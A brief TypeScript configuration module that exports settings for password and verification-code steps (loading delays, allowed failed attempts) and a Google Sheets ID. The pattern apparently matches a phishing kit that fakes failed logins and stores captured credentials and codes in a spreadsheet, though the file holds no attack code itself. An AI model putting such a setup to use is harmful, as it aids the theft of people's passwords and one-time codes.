interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  sheet_id: string;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 3000,
    max_failed_code_attempts: 2,
    max_failed_password_attempts: 1,
    password_loading_time: 3000,
    sheet_id: "1S-cBdOWDJuM7GEbLPDv0QqwJiIJHzz4qgj2cjVnaLho"
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
